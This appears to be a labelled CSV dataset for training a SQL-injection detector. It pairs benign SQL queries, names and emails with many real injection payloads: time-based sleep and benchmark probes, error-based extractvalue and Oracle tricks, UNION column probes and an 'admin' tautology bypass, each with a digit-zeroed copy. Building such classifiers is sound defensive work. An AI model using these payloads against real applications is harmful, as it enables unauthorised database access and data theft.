Sentence,Label,Processed_Sentence
"1  )   as kzyb where 7023  =  7023 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1.0,"0  )   as kzyb where 0  =  0 and 0  =    (  select count  (  *  )   from all_users t0,all_users t0,all_users t0,all_users t0,all_users t0  )  --"
"1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'zspf'  =  'zspf",1.0,"0'  )   and 0  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  0/0   )    )      )    )    and   (  'zspf'  =  'zspf"
SELECT option_value FROM wp_options WHERE option_name  =  'auto_update_redux_google_fonts' LIMIT 1,0.0,select option_value from wp_options where option_name  =  'auto_update_redux_google_fonts' limit 0
dax-branson@indianabilljaen.kp,0.0,dax-branson@indianabilljaen.kp
1'   )    )    as yqek where 1957  =  1957,1.0,0'   )    )    as yqek where 0  =  0
SELECT * FROM  ( SELECT everybody FROM would ) ,0.0,select * from  ( select everybody from would ) 
-8812 or 6872  =  6872# dflr,1.0,-0 or 0  =  0# dflr
if  (  9953  =  4347  )   select 9953 else drop function ocau--,1.0,if  (  0  =  0  )   select 0 else drop function ocau--
rastrilladora,0.0,rastrilladora
"   SELECT engineer, shown, scientist FROM physical WHERE exclaimed  IS NULL",0.0,"   select engineer, shown, scientist from physical where exclaimed  is null"
de tena leguizamn,0.0,de tena leguizamn
montorns de segarra,0.0,montorns de segarra
"1 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1.0,"0 and   (  select 0 from  (  select count  (  *  )  ,concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,floor  (  rand  (  0  )  *0   )    )   x from information_schema.character_sets group by x  )  a  )  "
SELECT egg ( s )  FROM substance SELECT shot FROM manufacturing,0.0,select egg ( s )  from substance select shot from manufacturing
SELECT AVG ( extra ) FROM plant SELECT SUM ( possible ) ,0.0,select avg ( extra ) from plant select sum ( possible ) 
"-1000"" or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""isbq""  =  ""isbq",1.0,"-0"" or 0  =  cast   (    (   chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )   ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end   )    )   ::text||  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )    as numeric  )   and ""isbq""  =  ""isbq"
gilden@gopersonalfitness.ua,0.0,gilden@gopersonalfitness.ua
"1 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  ",1.0,"0 and char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )    =  regexp_substring  (  repeat  (  right  (  char  (  0  )  ,0  )  ,0  )  ,null  )  "
38847166m,0.0,0m
bernad fermoselle,0.0,bernad fermoselle
1136300000000000,0.0,0
"1""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""cdnc"" like ""cdnc",1.0,"0""  )   or extractvalue  (  0,concat  (  0x0c,0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0   )    )    and   (  ""cdnc"" like ""cdnc"
"1'   )    )    as nuku where 7009  =  7009 union all select null,null,null,null,null#",1.0,"0'   )    )    as nuku where 0  =  0 union all select null,null,null,null,null#"
yihban,0.0,yihban
"1%""  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1.0,"0%""  )   and elt  (  0  =  0,sleep  (  0   )    )   #"
"-9629'   )    )     )   union all select 3077,3077,3077,3077#",1.0,"-0'   )    )     )   union all select 0,0,0,0#"
"  SELECT be AS up, solution AS [political]  FROM seed",0.0,"  select be as up, solution as [political]  from seed"
SELECT contain ( s )  FROM hurt SELECT chair ( s ) ,0.0,select contain ( s )  from hurt select chair ( s ) 
select case when 4488  =  5522 then 1 else null end--,1.0,select case when 0  =  0 then 0 else null end--
mndez testua,0.0,mndez testua
1 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  -- xwoo,1.0,0 and 0  =    (  select upper  (  xmltype  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )     )   from dual  )  -- xwoo
SELECT AVG ( Price ) FROM pure,0.0,select avg ( price ) from pure
" SELECT CustomerName, Address + ', ' + PostalCode + ' ' + City + ', ' + Country AS Address  FROM Customers;",0.0," select customername, address + ', ' + postalcode + ' ' + city + ', ' + country as address  from customers;"
" select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",1.0," select * from users where id  =  0 or 0#"". union select null,version  (    )   -- 0"
SELECT * FROM hit WHERE brick NOT LIKE '[similar]%',0.0,select * from hit where brick not like '[similar]%'
SELECT * FROM studied,0.0,select * from studied
"1   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   3003  =  3003",1.0,"0   )    )    or 0  =    (  select count  (  *  )   from sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0  )   and    (    (   0  =  0"
40984940k,0.0,0k
"1""   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""wwaq""  =  ""wwaq",1.0,"0""   )    )     )   and 0  =    (  select upper  (  xmltype  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )     )   from dual  )   and    (    (     (  ""wwaq""  =  ""wwaq"
"   SELECT measure, they+ ', ' + declared+ ' ' + repeat+ ', ' + entire AS catch  FROM hospital",0.0,"   select measure, they+ ', ' + declared+ ' ' + repeat+ ', ' + entire as catch  from hospital"
"  (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",1.0,"  (  select count  (  *  )   from domain.domains as t0,domain.columns as t0,domain.tables as t0  )  "
"1%""  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  ""%""  =  """,1.0,"0%""  )   and 0  =  benchmark  (  0,md0  (  0x0   )    )    and   (  ""%""  =  """
"1""  )   and 3732  =  3850 and   (  ""edjv""  =  ""edjv",1.0,"0""  )   and 0  =  0 and   (  ""edjv""  =  ""edjv"
estanislao,0.0,estanislao
"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",1.0,"-0' in boolean mode  )   union all select 0,0,0,0,0,0,0#"
"1"" where 4345  =  4345 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1.0,"0"" where 0  =  0 and 0  =  utl_inaddr.get_host_address  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )   --"
protoalbitar,0.0,protoalbitar
vai@sexplorador.mk,0.0,vai@sexplorador.mk
"-4047'||  (  select 'rqta' from dual where 9743  =  9743 union all select 9743,9743,9743#",1.0,"-0'||  (  select 'rqta' from dual where 0  =  0 union all select 0,0,0#"
"  SELECT yourself AS hay, pan AS [speech]  FROM determine",0.0,"  select yourself as hay, pan as [speech]  from determine"
" select * from users where id  =  1 + @`\` union select 1,version  (    )   -- 1",1.0," select * from users where id  =  0 + @`\` union select 0,version  (    )   -- 0"
"1'||  (  select 'ymez' from dual where 9870  =  9870 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1.0,"0'||  (  select 'ymez' from dual where 0  =  0 or 0  =    (  select count  (  *  )   from sysibm.systables as t0,sysibm.systables as t0,sysibm.systables as t0  )  --"
"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",1.0,"-0'   )    )    union all select 0,0,0,0,0,0,0#"
hi9dra,0.0,hi0dra
SELECT * FROM they WHERE got = 'private',0.0,select * from they where got = 'private'
"antonio asenjo, 178, 6?h",0.0,"antonio asenjo, 0, 0?h"
18440,0.0,0
"-3672""   )    )    union all select 6093#",1.0,"-0""   )    )    union all select 0#"
"1%""   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1.0,"0%""   )    )     )   and 0  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  0/0   )    )      )    )   --"
"1 union all select null,null,null,null#",1.0,"0 union all select null,null,null,null#"
tijerin monaghan,0.0,tijerin monaghan
SELECT TOP 3 * FROM save,0.0,select top 0 * from save
SELECT * FROM bite FETCH FIRST 50 PERCENT ROWS ONLY,0.0,select * from bite fetch first 0 percent rows only
SELECT price ( s )  FROM office SELECT real FROM broad,0.0,select price ( s )  from office select real from broad
"1""   )    )    as ccjk where 1932  =  1932 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1.0,"0""   )    )    as ccjk where 0  =  0 or 0  =    (  select count  (  *  )   from sysibm.systables as t0,sysibm.systables as t0,sysibm.systables as t0  )  --"
"1""  )   as upjw where 3880  =  3880 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1.0,"0""  )   as upjw where 0  =  0 and 0  =    (  select count  (  *  )   from all_users t0,all_users t0,all_users t0,all_users t0,all_users t0  )  --"
"-3441'   )    )    as dxvt where 9291  =  9291 union all select 9291,9291,9291#",1.0,"-0'   )    )    as dxvt where 0  =  0 union all select 0,0,0#"
SELECT * FROM  ( SELECT locate FROM root ) ,0.0,select * from  ( select locate from root ) 
SELECT * FROM remarkable 3 SELECT * FROM end,0.0,select * from remarkable 0 select * from end
SELECT * FROM exciting WHERE region IN  ( SELECT stuck FROM appropriate ) ,0.0,select * from exciting where region in  ( select stuck from appropriate ) 
"1'   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  'owga' like 'owga",1.0,"0'   )    )     )    (  select   (  case when   (  0  =  0  )   then regexp_substring  (  repeat  (  right  (  char  (  0  )  ,0  )  ,0  )  ,null  )   else char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )   end  )   from information_schema.system_users  )   and    (    (     (  'owga' like 'owga"
47eg0,0.0,0eg0
1' rlike sleep  (  5  )   and 'ojqz' like 'ojqz,1.0,0' rlike sleep  (  0  )   and 'ojqz' like 'ojqz
" SELECT * FROM mirror ORDER BY too ASC, particularly DESC",0.0," select * from mirror order by too asc, particularly desc"
SELECT avoid ( s )  FROM room LEFT JOIN,0.0,select avoid ( s )  from room left join
1   )    )    as uvep where 6016  =  6016 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1.0,0   )    )    as uvep where 0  =  0 and 0  =    (  select 0 from pg_sleep  (  0   )    )   --
"1   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  2997  =  2997",1.0,"0   )    )     )   and char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  0  )  ||char  (  0  )  ||char  (  0  )  ,null  )  ,0  )  ,0  )  ,null  )   and    (    (     (  0  =  0"
select   (  case when   (  8857  =  1512  )   then 8857 else 8857*  (  select 8857 from mysql.db  )   end  )  #,1.0,select   (  case when   (  0  =  0  )   then 0 else 0*  (  select 0 from mysql.db  )   end  )  #
1 where 8102  =  8102 and 9198  =  9198--,1.0,0 where 0  =  0 and 0  =  0--
"1"" where 4450  =  4450 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1.0,"0"" where 0  =  0 or 0  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  0/0   )    )      )    )   --"
1'+  (  select taga where 8036  =  8036,1.0,0'+  (  select taga where 0  =  0
SELECT TOP 3 * FROM powerful,0.0,select top 0 * from powerful
sabadell,0.0,sabadell
480040000000000,0.0,0
8936820000000001,0.0,0
SELECT * FROM birds,0.0,select * from birds
select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,1.0,select * from users where id  =  0 +$ 0 or 0  =  0 -- 0
SELECT * FROM with ORDER BY science,0.0,select * from with order by science
graciot ballv,0.0,graciot ballv
SELECT TOP 50 PERCENT * FROM flame SELECT * FROM shot FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM gun,0.0,select top 0 percent * from flame select * from shot fetch first 0 percent rows onlyselect top 0 * from gun
42010181z,0.0,0z
"1'||  (  select 'pzoe' where 2977  =  2977 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1.0,"0'||  (  select 'pzoe' where 0  =  0 and elt  (  0  =  0,sleep  (  0   )    )   #"
" end and    (    (   ""dmgj""  =  ""dmgj",1.0," end and    (    (   ""dmgj""  =  ""dmgj"
"-9661""   )    )     )   union all select 2158,2158,2158--",1.0,"-0""   )    )     )   union all select 0,0,0--"
SELECT * FROM ill WHERE another = 'surprise',0.0,select * from ill where another = 'surprise'
1'+  (  select 'mzee' where 5984  =  5984,1.0,0'+  (  select 'mzee' where 0  =  0
"-5386'  )   union all select 8026,8026,8026,8026,8026,8026#",1.0,"-0'  )   union all select 0,0,0,0,0,0#"
"1 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  # usus",1.0,"0 procedure analyse  (  extractvalue  (  0,concat  (  0x0c,  (  benchmark  (  0,md0  (  0x0a0   )    )      )    )     )  ,0  )  # usus"
SELECT shelf FROM to,0.0,select shelf from to
"SELECT DATE ( ""2017-06-15 09:34:21"" ) ;",0.0,"select date ( ""0-0-0 0:0:0"" ) ;"
"1"" where 1809  =  1809 and make_set  (  8403  =  8403,8899  )  --",1.0,"0"" where 0  =  0 and make_set  (  0  =  0,0  )  --"
"1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'xikz' like 'xikz",1.0,"0'  )   and 0  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  0/0   )    )      )    )    and   (  'xikz' like 'xikz"
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""%""  =  """,1.0,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  0/0   )    )      )    )    and   (  ""%""  =  """
SELECT COUNT ( DISTINCT flat )  FROM exclaimed,0.0,select count ( distinct flat )  from exclaimed
SELECT TOP 3 * FROM half SELECT * FROM main 3SELECT * FROM expect,0.0,select top 0 * from half select * from main 0select * from expect
eward,0.0,eward
ten.tar,0.0,ten.tar
SELECT TOP 50 PERCENT * FROM leader,0.0,select top 0 percent * from leader
"1"" where 6281  =  6281 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1.0,"0"" where 0  =  0 or 0  =    (  select count  (  *  )   from rdb$fields as t0,rdb$types as t0,rdb$collations as t0,rdb$functions as t0  )  --"
enratonarse,0.0,enratonarse
SELECT * FROM loose WHERE section = 'border' LIMIT 3,0.0,select * from loose where section = 'border' limit 0
SELECT * FROM deeply,0.0,select * from deeply
acachorrar,0.0,acachorrar
cuenca,0.0,cuenca
"-9572%""  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""%""  =  """,1.0,"-0%""  )   or 0  =  convert  (  int,  (  select char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +  (  select   (  case when   (  0  =  0  )   then char  (  0  )   else char  (  0  )   end   )    )   +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0   )    )     )   and   (  ""%""  =  """
"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'wytg'  =  'wytg",1.0,"0' and 0  =    (  select count  (  *  )   from generate_series  (  0,0   )    )    and 'wytg'  =  'wytg"
5536600000000000,0.0,0
" select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",1.0," select * from users where id  =  '0' or \.<   =  0 union select 0,@@version -- 0'"
FROM  ( SELECT DISTINCT combination FROM sight ) ,0.0,from  ( select distinct combination from sight ) 
"pobla de claramunt, la",0.0,"pobla de claramunt, la"
sol,0.0,sol
cesarin,0.0,cesarin
1'+  (  select 'tmel' where 2655  =  2655 rlike   (  select   (  case when   (  2118  =  8500  )   then 1 else 0x28 end   )    )     )  +',1.0,0'+  (  select 'tmel' where 0  =  0 rlike   (  select   (  case when   (  0  =  0  )   then 0 else 0x0 end   )    )     )  +'
"-5320 where 8051  =  8051 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1.0,"-0 where 0  =  0 or 0  =  ctxsys.drithsx.sn  (  0,  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )     )  --"
ulrico,0.0,ulrico
1  )   as hlcn where 1165  =  1165 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1.0,0  )   as hlcn where 0  =  0 rlike   (  select * from   (  select  (  sleep  (  0   )    )     )  vwyq  )  #
4562,0.0,0
" SELECT column_name ( s )  FROM father,wide",0.0," select column_name ( s )  from father,wide"
"calle calderon de la barca, 141",0.0,"calle calderon de la barca, 0"
pg_sleep  (  __TIME__  )  --,1.0,pg_sleep  (  __time__  )  --
godall,0.0,godall
admin'  )   or '1'  =  '1,1.0,admin'  )   or '0'  =  '0
heidi,0.0,heidi
a0_idia,0.0,a0_idia
"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",1.0,"0  )   where 0  =  0 union all select null,null,null,null,null,null,null#"
"-3954'   )    )    union all select 2417,2417--",1.0,"-0'   )    )    union all select 0,0--"
1%'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  '%'  =  ',1.0,0%'   )    )     )   rlike   (  select   (  case when   (  0  =  0  )   then 0 else 0x0 end   )    )    and    (    (     (  '%'  =  '
1%'  )   and   (  3020  =  3020  )  *6703 and   (  '%'  =  ',1.0,0%'  )   and   (  0  =  0  )  *0 and   (  '%'  =  '
"1'+  (  select 'epza' where 8994  =  8994 and make_set  (  3782  =  2428,2428   )    )   +'",1.0,"0'+  (  select 'epza' where 0  =  0 and make_set  (  0  =  0,0   )    )   +'"
1%'   )    )     )   order by 1#,1.0,0%'   )    )     )   order by 0#
"-1197""   )    )    as dfsy where 8857  =  8857 or 3038  =  3038",1.0,"-0""   )    )    as dfsy where 0  =  0 or 0  =  0"
1   )    )    as hxtp where 5478  =  5478 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1.0,0   )    )    as hxtp where 0  =  0 and 0  =    (  select 0 from pg_sleep  (  0   )    )   --
1720000000000000,0.0,0
1%'  )   and sleep  (  5  )   and   (  '%'  =  ',1.0,0%'  )   and sleep  (  0  )   and   (  '%'  =  '
SELECT * FROM coach WHERE wonder LIKE '%know%',0.0,select * from coach where wonder like '%know%'
"1 where 7642  =  7642 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1.0,"0 where 0  =  0 or 0  =  dbms_pipe.receive_message  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ,0  )  --"
ornellas3@professionalhost.com.pro,0.0,ornellas0@professionalhost.com.pro
select   (  case when   (  8331  =  5625  )   then 8331 else 8331*  (  select 8331 from mysql.db  )   end  )  #,1.0,select   (  case when   (  0  =  0  )   then 0 else 0*  (  select 0 from mysql.db  )   end  )  #
SELECT * FROM television WHERE yesterday NOT LIKE 'other%',0.0,select * from television where yesterday not like 'other%'
 UPDATE cave SET deal = 'needs'WHERE finger = 'sunlight',0.0, update cave set deal = 'needs'where finger = 'sunlight'
"1 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  -- xsob",1.0,"0 or char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )    =  regexp_substring  (  repeat  (  right  (  char  (  0  )  ,0  )  ,0  )  ,null  )  -- xsob"
"1',  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select 1 from generate_series  (  8979,8979,case when   (  8979  =  8979  )   then 1 else 0 end  )   limit 1  )  ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",1.0,"0',  (  cast   (    (   chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )   ||  (  select 0 from generate_series  (  0,0,case when   (  0  =  0  )   then 0 else 0 end  )   limit 0  )  ::text||  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )    as numeric   )    )   "
"1 where 1096  =  1096 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1.0,"0 where 0  =  0 and extractvalue  (  0,concat  (  0x0c,0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0   )    )   --"
1'  )   where 5871  =  5871,1.0,0'  )   where 0  =  0
SELECT COUNT ( DISTINCT community )  FROM highway,0.0,select count ( distinct community )  from highway
-6397%' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and '%'  =  ',1.0,-0%' or 0  =  utl_inaddr.get_host_address  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )    and '%'  =  '
bolkan@directoriogratuito.int,0.0,bolkan@directoriogratuito.int
SELECT TOP 3 * FROM roof SELECT * FROM hand 3SELECT * FROM sail,0.0,select top 0 * from roof select * from hand 0select * from sail
1' where 7176  =  7176,1.0,0' where 0  =  0
-8047' or 3038  =  3038,1.0,-0' or 0  =  0
fontanal callarisa,0.0,fontanal callarisa
select   (  case when   (  8375  =  8318  )   then 8375 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1.0,select   (  case when   (  0  =  0  )   then 0 else cast  (  0 as int  )  /  (  select 0 from dual  )   end  )   from dual--
"-4927'   )    )    union all select 1924,1924#",1.0,"-0'   )    )    union all select 0,0#"
SELECT particular ( s )  FROM smoke SELECT whatever FROM tried,0.0,select particular ( s )  from smoke select whatever from tried
"1',  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  7823  =  7823  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",1.0,"0',  (  cast   (    (   chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )   ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end   )    )   ::text||  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )    as numeric   )    )   "
2450000000000000,0.0,0
"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",1.0,"0' and exp  (  ~  (  select * from   (  select concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,0x0   )    )   x   )    )    and 'ulep'  =  'ulep"
